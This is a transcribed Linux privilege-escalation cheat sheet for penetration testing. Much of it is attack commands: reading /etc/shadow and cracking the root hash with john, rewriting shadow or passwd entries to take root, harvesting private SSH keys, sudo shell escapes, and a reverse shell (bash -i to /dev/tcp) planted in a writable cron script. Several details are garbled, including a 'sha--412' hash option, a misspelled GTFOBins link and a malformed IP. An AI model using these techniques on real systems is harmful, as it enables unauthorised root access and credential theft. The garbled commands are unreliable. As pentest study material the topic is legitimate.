# Linux Privilege Escalation

|                    |                                  |
|-------------------:|----------------------------------|
| Author             | ?                                |
| Upload Date        | 2023-03-01                       |
| Source             | MindMap image share via LinkedIn |
| Transcriber/Editor | David Boyd                       |

## 1. Service Exploit

1. `ps aux | grep "^root"`

2. Enumerating Program Versions: `<prgm> --version`

3. Look for exploit in [GHDB][] or another...

## 2. Weak File Permissions

1. Find all readable & writable files & directories

    - `find /etc/ -maxdepth 1 -readable -type f`
    - `find /etc/ -maxdepth 1 -writable -type f`
    - `find / -executable -writable -type d 2>/dev/null`

2. /etc/shadow

    - IF we can ***read*** `/etc/shadow`; THEN

      1. `cat /etc/shadow`
      2. Get hashes
      3. Run `john` the Ripper against the ***root*** hash

    - IF we can ***write*** on `/etc/shadow`; THEN:

      1. Generate a password with any hash (i.e. SHA-512):
         `mkpasswd -m sha--412 <new-pass>`
      2. Put new-pass in shadow file
      3. Switch to root: `su root`

3. /etc/passwd

    - IF we can ***write*** to `/etc/passwd`; THEN

      1. Generate a new password hash: `openssl passwd new-password`
      2. Edit the `/etc/passwd`:
          - Place the generated password hash between the first & second colon
            `:` of the ***root user's row*** (replacing the `x`)
      3. Switch to root: `su root`

## 3. Backups

- Some common places include user home directories, the `/` (root) directory,
   `/tmp`, and `/var/backups`

- Search for **PRIVATE KEYS** to use for loggins

## 4. SSH Key

1. Get SSH keys using `linpeas`

2. Check if we can make **root logins** via SSH: `grep PermitRootLogin
   /etc/ssh/sshd_config`

3. IF SSH KEY Copy key in local machine; THEN:

    1. Give 600 permission: `chmod 600 /path/to/key`
    2. Login: `ssh -i root_key root@x.x.x.x.x`

## 5. Sudo find in ( /etc/sudoers )

1. Get sudo users' rules: `sudo -l`

2. IF `sudo su` does NOT run; THEN try:

    - `sudo -s`
    - `sudo -i`
    - `sudo /bin/bash`
    - `sudo passwd`

3. After listing programs, get their **shell escape sequences** via: [GTFOBins]

## 6. Best Technique

- IF we don't know the user hash and password and do not have read permissions
on the `/etc/shadow` or `/etc/passwd` files; THEN:

    1. Run program with `-f /etc/shadow`
    2. Extract hashes
    3. Use `su`

## 7. Cron Jobs ( schedule tasks )

- **File Permissions**

  - IF we found file `.sh`: `bash -i >&/dev/tcp/x.x.x.x/4444 0>&1`

- **`PATH` Environment Variable**

  - IF we can *write* in `.ocation` such as our directory; THEN:

    - write a script and put it in the **home** directory --it'll run auto

## NFS ( configured in `/etc/exports` )

[GHDB]: https://www.exploit-db.com/google-hacking-database/
[GTFOBins]: https://ghtfobins.github.io/
